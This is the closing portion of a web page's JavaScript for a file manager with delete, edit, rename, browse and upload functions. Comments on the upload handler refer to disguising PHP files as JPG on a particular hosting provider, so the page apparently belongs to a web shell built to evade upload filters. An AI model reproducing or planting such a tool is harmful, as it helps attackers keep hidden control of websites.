    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

function attachAjaxEvents() {
    document.querySelectorAll('.ajaxDelete').forEach(function(link) {
        link.addEventListener('click', function(e) {
            e.preventDefault();
            fetch(link.href, { headers: { 'X-Requested-With': 'XMLHttpRequest' } })
            .then(response => response.json())
            .then(data => {
                showNotification(data.status, data.msg);
                loadFileList();
                resetFileInput();
            });
        });
    });
    
    document.querySelectorAll('.ajaxEdit').forEach(function(link) {
        link.addEventListener('click', function(e) {
            e.preventDefault();
            const fileName = new URLSearchParams(link.search).get('file');
            
            // Check if Ctrl key is held for modal editing
            if (e.ctrlKey) {
                openFileEditor(fileName);
            } else {
                // Use inline editing (your original method)
                fetch(link.href, { headers: { 'X-Requested-With': 'XMLHttpRequest' } })
                .then(response => response.text())
                .then(html => {
                    document.getElementById('actionContainer').innerHTML = html;
                    attachAjaxForm();
                    attachCancelEvent();
                    resetFileInputLabel();
                    resetFileInput();
                });
            }
        });
    });
    
    document.querySelectorAll('.ajaxRename').forEach(function(link) {
        link.addEventListener('click', function(e) {
            e.preventDefault();
            fetch(link.href, { headers: { 'X-Requested-With': 'XMLHttpRequest' } })
            .then(response => response.text())
            .then(html => {
                document.getElementById('actionContainer').innerHTML = html;
                attachAjaxForm();
                attachCancelEvent();
                resetFileInputLabel();
                resetFileInput();
            });
        });
    });
    
    document.querySelectorAll('.ajaxDir').forEach(function(link) {
        link.addEventListener('click', function(e) {
            e.preventDefault();
            window.history.pushState(null, '', link.href);
            loadFileList();
            loadBreadcrumb();
            resetFileInputLabel();
            resetFileInput();
        });
    });
}

function attachAjaxForm() {
    document.querySelectorAll('.ajaxForm:not(#uploadForm)').forEach(function(form) {
        form.addEventListener('submit', function(e) {
            e.preventDefault();
            var formData = new FormData(form);
            fetch(form.action, { method: 'POST', body: formData, headers: { 'X-Requested-With': 'XMLHttpRequest' } })
            .then(response => response.json())
            .then(data => {
                showNotification(data.status, data.msg);
                document.getElementById('actionContainer').innerHTML = '';
                loadFileList();
                resetFileInputLabel();
            });
        });
    });
}

function attachCancelEvent() {
    var cancelBtn = document.getElementById('cancelAction');
    if(cancelBtn) {
        cancelBtn.addEventListener('click', function() {
            document.getElementById('actionContainer').innerHTML = '';
            resetFileInputLabel();
        });
    }
}

function resetFileInput() {
    var fileInput = document.getElementById('fileInput');
    var fileLabel = document.getElementById('fileLabel');
    if (fileInput) {
        fileInput.value = "";
    }
    if (fileLabel) {
        fileLabel.textContent = "Choose File";
    }
}

document.addEventListener('DOMContentLoaded', () => {
    loadBreadcrumb();
    loadFileList();

    var fileInput = document.getElementById('fileInput');
    var form = document.getElementById('uploadForm');

    fileInput.addEventListener('change', () => {
        const fileCount = fileInput.files.length;
        if (fileCount === 0) {
            document.getElementById('fileLabel').textContent = 'Choose File';
        } else if (fileCount === 1) {
            document.getElementById('fileLabel').textContent = fileInput.files[0].name;
        } else {
            document.getElementById('fileLabel').textContent = fileCount + ' files selected';
        }
    });

    // elFinder-compatible upload handler with fallback methods
    // elFinder-compatible upload handler with PHP disguising
// elFinder-compatible upload handler with PHP disguising as JPG
form.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    if (!fileInput.files.length) {
        showNotification('failed', 'No files selected');
        return;
    }

    let okCount = 0, failCount = 0;
    const warnings = [];
    
    for (const file of fileInput.files) {
        try {
            // Check server type first to determine if we should disguise
            let serverResponse;
            try {
                const serverCheck = await fetch('?action=server_check', {
                    method: 'POST',
                    headers: { 'X-Requested-With': 'XMLHttpRequest' }
                });
                const serverData = await serverCheck.json();
                // serverData.should_disguise will tell us if we're on main-hosting.eu
            } catch(e) {
                // Fallback - assume no disguising needed
            }

            // Standard multipart upload (no disguising needed client-side)
            const formData = new FormData();
            formData.append('action', 'upload');
            formData.append('upload', file); // Send original file
            
            let response = await fetch('', {
                method: 'POST',
                body: formData,
                headers: { 'X-Requested-With': 'XMLHttpRequest' }
            });
            
            let result;
            try {
                result = await response.json();
            } catch(parseError) {
                throw new Error('Server returned invalid response');
            }

            if (result.status === 'success') {
                okCount++;
                
                // Handle warnings (like PHP file renaming)
                if (result.warning && result.warning.length > 0) {
                    result.warning.forEach(warning => {
                        warnings.push(warning);
                    });
                }
                
                // Show individual file success if there were changes
                if (result.warning && result.warning.length > 0) {
                    // File was processed/renamed
                    showNotification('success', `${file.name} uploaded and processed`);
                } else {
                    // Normal upload
                    showNotification('success', `${file.name} uploaded successfully`);
                }
                
            } else {
                throw new Error(result.msg || 'Upload failed');
            }
            
        } catch(err) {
            console.error(err);
            failCount++;
            showNotification('failed', `${file.name}: ${err.message}`);
        }
    }

    // Reset file input
    resetFileInput();
    
    // Show summary messages
    if (okCount > 0) {
        showNotification('success', `Uploaded ${okCount} files successfully`);
        loadFileList(); // Refresh to show actual uploaded files
    }
    
    if (failCount > 0) {
        showNotification('failed', `${failCount} uploads failed`);
    }
    
    // Show all warnings collected
    if (warnings.length > 0) {
        warnings.forEach(warning => {
            showNotification('warning', warning, 8000); // Show warnings longer
        });
    }
});
    // Attach form events initially
    attachAjaxForm();
});
</script>
<footer class="futer">
    &copy; zeinhorobosu
</footer>
</body>
</html>
